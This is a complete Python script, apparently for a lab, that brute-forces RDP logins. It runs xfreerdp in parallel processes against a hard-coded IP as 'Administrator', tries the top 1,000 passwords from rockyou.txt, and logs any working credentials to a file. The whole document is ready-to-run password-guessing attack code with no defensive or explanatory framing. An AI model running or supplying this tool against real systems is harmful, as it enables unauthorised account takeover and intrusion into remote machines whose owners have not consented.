import subprocess
from multiprocessing import Pool, Manager, cpu_count
from collections import Counter

# Configuration
target_ip = "192.168.56.101"
username = "Administrator"
rockyou_path = "/usr/share/wordlists/rockyou.txt"
top_n = 1000
success_log = "rdp_success.txt"

# Extract top N passwords from rockyou.txt
def get_top_passwords(filepath, top_n):
    with open(filepath, "r", encoding="latin-1", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]
    counter = Counter(passwords)
    return [pw for pw, _ in counter.most_common(top_n)]

# Worker function
def attempt_login(args):
    password, found_flag = args
    if found_flag.value:
        return None

    command = [
        "xfreerdp",
        f"/u:{username}",
        f"/p:{password}",
        f"/v:{target_ip}",
        "/cert:ignore",
        "/log-level:OFF"
    ]
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=6)
        if b"connected" in result.stdout.lower():
            found_flag.value = True
            print(f"[+] SUCCESS: {username}:{password}")
            with open(success_log, "w") as f:
                f.write(f"{username}:{password}\n")
            return password
    except subprocess.TimeoutExpired:
        print(f"[!] TIMEOUT: {password}")
    except Exception as e:
        print(f"[!] ERROR: {password} -> {str(e)}")
    return None

# Main
if __name__ == "__main__":
    print(f"[*] Extracting top {top_n} passwords from rockyou.txt...")
    passwords = get_top_passwords(rockyou_path, top_n)

    manager = Manager()
    found_flag = manager.Value('b', False)

    print(f"[*] Starting RDP brute-force with {len(passwords)} passwords...")
    with Pool(cpu_count() * 2) as pool:
        try:
            args = [(password, found_flag) for password in passwords]
            for result in pool.imap_unordered(attempt_login, args):
                if result:
                    print(f"[+] Password cracked: {result}")
                    break
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user. Exiting...")
            pool.terminate()
        finally:
            pool.close()
            pool.join()

    if not found_flag.value:
        print("[-] Password not found in top list.")